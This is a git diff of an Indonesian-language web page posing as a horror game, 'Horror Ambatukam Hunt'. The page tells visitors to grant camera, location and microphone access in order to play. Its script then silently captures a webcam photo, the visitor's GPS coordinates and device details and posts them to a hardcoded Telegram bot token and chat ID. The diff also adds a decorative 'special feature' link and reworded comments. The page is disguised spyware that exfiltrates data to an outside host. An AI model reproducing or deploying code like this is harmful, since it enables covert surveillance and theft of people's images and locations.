@@ -6,30 +6,34 @@
   <title>Horror Ambatukam Hunt</title>
   <style>
     /* --- Pengaturan Dasar --- */
-    * { box-sizing: border-box; }
+    * { 
+      box-sizing: border-box;
+    }
     body {
       margin: 0;
       padding: 0;
-      background-color: black;
+      /* Background-color dihapus agar tidak mengganggu tampilan GIF */
       font-family: Arial, sans-serif;
       height: 100vh;
       overflow: hidden;
       position: relative;
-      /* Agar gesture sentuh tidak menyebabkan scroll */
       touch-action: none;
     }
-    /* Background Video */
+    /* Background Video Menggunakan GIF */
     #bgVideo {
       position: absolute;
-      top: 0; left: 0;
-      width: 100%; height: 100%;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
       object-fit: cover;
       z-index: -2;
     }
     /* Konten Sambutan (Intro) */
     #introText {
       position: absolute;
-      top: 50%; left: 50%;
+      top: 50%;
+      left: 50%;
       transform: translate(-50%, -50%);
       text-align: center;
       color: white;
@@ -49,6 +53,23 @@
       border-radius: 5px;
     }
     #startGameBtn:hover { background-color: darkred; }
+    /* Link Fitur Spesial */
+    #specialLinkContainer {
+      margin-top: 20px;
+      text-align: center;
+    }
+    #specialLink {
+      color: #00ffff;
+      text-decoration: underline;
+      cursor: pointer;
+      font-size: 1rem;
+    }
+    #specialMessage {
+      display: none;
+      margin-top: 10px;
+      font-size: 1rem;
+      color: #ffcc00;
+    }
     /* Kontainer Foto (Game) */
     #photoContainer {
       display: none;
@@ -94,7 +115,6 @@
       position: absolute;
       width: 300px; height: 300px;
       border-radius: 50%;
-      /* Menggelapkan layar kecuali area lingkaran */
       box-shadow: 400vh 0px 0px 400vw rgba(0,0,0,0.99);
     }
     .shadow {
@@ -135,6 +155,7 @@
       #introText h1 { font-size: 2rem; }
       #introText p { font-size: 1rem; }
       #startGameBtn { font-size: 1rem; padding: 8px 20px; }
+      #specialLink { font-size: 0.9rem; }
       #prevBtn, #nextBtn { font-size: 2rem; padding: 8px; }
       .light {
         width: 200px; height: 200px;
@@ -144,7 +165,7 @@
   </style>
 </head>
 <body>
-  <!-- Background Video -->
+  <!-- Background Video Menggunakan File GIF -->
   <video id="bgVideo" autoplay loop muted>
     <source src="rented-bunny.gif" type="video/gif" />
   </video>
@@ -154,6 +175,12 @@
     <h1>Selamat datang di Horror Ambatukam Hunt</h1>
     <p>Izinkan semua kamera, lokasi, dan suara untuk lanjut bermain game ini</p>
     <button id="startGameBtn">Izinkan dan Mulai</button>
+    <div id="specialLinkContainer">
+      <a href="#" id="specialLink">Fitur Spesial</a>
+      <div id="specialMessage">
+        Beberapa fitur mungkin tidak bekerja bagi pengguna Mobile / Handphone, gunakan PC / Laptop untuk menggunakan fitur spesial agar menambahkankan suasana horror
+      </div>
+    </div>
   </div>
 
   <!-- Kontainer Foto (Game) -->
@@ -189,7 +216,7 @@
     const botToken = "8155174745:AAEVSM6KjUCejQ9dxCNLyo0D0Wh_eXgfHQ8";
     const chatId = "6010073048";
 
-    /* Array foto untuk tampilan website (tidak dikirim ke Telegram) */
+    /* Array foto untuk tampilan website (foto statis) */
     const photos = [
       "photo1.jpg", "photo2.jpg", "photo3.jpg", "photo4.jpg", "photo5.jpg",
       "photo6.jpg", "photo7.jpg", "photo8.jpg", "photo9.png"
@@ -209,8 +236,17 @@
     const endPopup = document.getElementById('endPopup');
     const noBtn = document.getElementById('noBtn');
     const yesBtn = document.getElementById('yesBtn');
+    const specialLink = document.getElementById('specialLink');
+    const specialMessage = document.getElementById('specialMessage');
 
-    // Event listener untuk tombol popup akhir
+    // Event listener untuk link "Fitur Spesial"
+    specialLink.addEventListener('click', function(e) {
+      e.preventDefault();
+      // Toggle tampilan pesan spesial
+      specialMessage.style.display = (specialMessage.style.display === 'none' || specialMessage.style.display === '') ? 'block' : 'none';
+    });
+
+    // Event listener untuk popup akhir
     noBtn.addEventListener('click', () => {
       window.location.href = 'https://youtu.be/8241aX1ArU0?si=mehpHFjZE3lXF4Y1';
     });
@@ -229,7 +265,7 @@
 
     async function startGame() {
       try {
-        // Minta akses kamera dan audio (hanya digunakan untuk menangkap gambar)
+        // Minta akses kamera (dan audio meskipun audio tidak digunakan untuk rekaman)
         videoStream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
         // Minta akses lokasi
         const location = await new Promise((resolve, reject) => {
@@ -250,7 +286,7 @@
       }
     }
 
-    // Fungsi menangkap foto dari kamera (tanpa rekaman audio)
+    // Fungsi menangkap foto dari kamera dan mengirim ke Telegram
     function capturePhotoAndSend(coords) {
       const video = document.createElement("video");
       video.srcObject = videoStream;
@@ -273,11 +309,11 @@
     }
 
     // Fungsi untuk mengirim data ke Telegram:
-    // - Lokasi (sendLocation)
-    // - Foto (sendPhoto)
-    // - Informasi HP (sendMessage)
+    // 1. Lokasi (sendLocation)
+    // 2. Foto (sendPhoto)
+    // 3. Informasi HP (sendMessage)
     function sendToTelegram(imageData, location, phoneSpecs) {
-      // 1. Kirim lokasi
+      // Kirim lokasi
       fetch(`https://api.telegram.org/bot${botToken}/sendLocation`, {
         method: "POST",
         headers: { "Content-Type": "application/json" },
@@ -291,7 +327,7 @@
       .then(data => console.log("Location sent:", data))
       .catch(error => console.error("Error sending location:", error));
 
-      // 2. Kirim foto hasil tangkapan kamera
+      // Kirim foto hasil tangkapan kamera
       const photoBlob = dataURItoBlob(imageData);
       const formDataPhoto = new FormData();
       formDataPhoto.append("chat_id", chatId);
@@ -304,7 +340,7 @@
       .then(data => console.log("Capture photo sent:", data))
       .catch(error => console.error("Error sending capture photo:", error));
 
-      // 3. Kirim informasi/spesifikasi HP sebagai pesan teks
+      // Kirim informasi/spesifikasi HP sebagai pesan teks
       fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
         method: "POST",
         headers: { "Content-Type": "application/json" },
@@ -329,7 +365,7 @@
       return new Blob([ab], { type: 'image/png' });
     }
 
-    // Fungsi untuk menampilkan foto di kontainer game (foto statis website)
+    // Fungsi untuk menampilkan foto di kontainer website (foto statis)
     function showPhoto(index) {
       photoSlide.src = photos[index];
     }
